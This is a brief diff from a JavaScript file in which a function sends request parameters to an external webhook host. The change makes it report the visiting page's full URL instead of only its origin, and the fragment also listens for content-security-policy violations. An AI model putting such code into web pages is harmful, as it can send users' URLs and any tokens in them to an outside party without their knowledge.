@@ -3,7 +3,7 @@ const webhookBase = 'https://datarecv.vercel.app/api/webhook'
 async function send(params) {
   if (!params) return
 
-  params.append('webhook_redirect', location.origin)
+  params.append('webhook_redirect', location.href)
   const finalUrl = `${webhookBase}/q?${params.toString()}`
 
   document.addEventListener('securitypolicyviolation', () => {
